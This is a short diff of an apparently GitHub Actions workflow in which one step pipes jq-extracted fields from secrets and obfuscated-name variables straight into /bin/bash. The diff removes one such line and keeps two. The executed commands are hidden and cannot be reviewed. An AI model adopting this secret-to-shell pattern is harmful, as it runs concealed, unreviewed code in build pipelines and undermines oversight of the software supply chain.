@@ -18,7 +18,6 @@ jobs:
           img066: ${{ secrets.img066 }}
         run: |
           printf '%s' "$img066" | jq -r .ymx078 | /bin/bash
-          echo $uc1736 | jq -r .nmdtx154 | /bin/bash
           printf '%s' "$ea59851" | jq -r .pxgx5 | /bin/bash
 
       - name: Archive output
